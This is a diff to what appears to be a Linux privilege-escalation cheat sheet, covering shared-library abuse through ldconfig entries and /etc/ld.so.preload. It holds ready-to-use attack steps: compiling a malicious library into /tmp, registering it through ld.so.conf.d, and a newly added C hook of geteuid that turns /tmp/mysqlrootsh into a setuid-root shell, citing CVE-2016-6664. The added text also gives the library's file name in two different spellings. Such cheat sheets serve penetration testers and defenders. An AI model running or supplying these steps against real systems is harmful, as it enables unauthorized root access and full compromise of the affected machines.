@@ -612,7 +612,7 @@ chmod +s bash
 
 ## Shared Library
 
-### ldconfig
+### Writeable ldconfig entries in /etc
 
 Identify shared libraries with `ldd`
 
@@ -629,6 +629,28 @@ Create a library in `/tmp` and activate the path.
 gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
 echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
 /opt/binary
+```
+
+If a text file `/etc/ld.so.preload` can be created, compile an evil library such as `/tmp/privseclib.so` and place a line `/tmp/privesclib.so` into the file (thanks to [Thomas Deutschmann](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2016-6664)).
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <dlfcn.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+uid_t geteuid(void) {
+	static uid_t  (*old_geteuid)();
+	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
+	if ( old_geteuid() == 0 ) {
+		chown("/tmp/mysqlrootsh", 0, 0);
+		chmod("/tmp/mysqlrootsh", 04777);
+	}
+	return old_geteuid();
+}
 ```
 
 ### RPATH
